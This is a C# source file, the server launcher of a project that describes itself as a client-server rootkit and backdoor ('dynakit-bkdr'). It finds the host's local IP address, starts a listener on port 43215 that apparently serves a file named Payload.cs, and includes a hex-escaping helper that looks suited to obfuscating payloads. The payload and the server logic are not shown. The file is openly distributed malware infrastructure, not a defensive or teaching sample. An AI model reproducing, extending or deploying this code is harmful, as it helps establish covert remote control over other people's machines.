/*  dynakit-bkdr, dynamic compilation client-server rootkit.
 *  Copyright (C) 2024 Daniel Molinero Lucas
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

using System;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Reflection;

IPAddress? _localAddr;
Console.WriteLine("Starting Server\n");
Console.WriteLine("    dynakit-bkdr Copyright (C) 2024 Daniel Molinero Lucas\r\n" +
                  "    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\r\n" +
                  "    This is free software, and you are welcome to redistribute it\r\n" +
                  "    under certain conditions; type `show c' for details.\n");

do
{
    using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
    {
        socket.Connect("8.8.8.8", 65530);
        IPEndPoint? endPoint = socket.LocalEndPoint as IPEndPoint;
        _localAddr = endPoint?.Address;
    }
} while (_localAddr == null);

var path = Directory.GetParent(System.IO.Directory.GetCurrentDirectory()).Parent.Parent.FullName + @"\Payload.cs";
await new Server(path).StartServer(_localAddr, 43215);

#pragma warning disable CS8321 // Local function is declared but never used
static string GetHexaString(string input)
{
    StringBuilder sb = new StringBuilder();
    foreach (var c in input)
    {
        sb.Append(string.Format(@"\x{0:x4}", (ushort)c));
    }
    return sb.ToString();
}
#pragma warning restore CS8321 // Local function is declared but never used

#line default
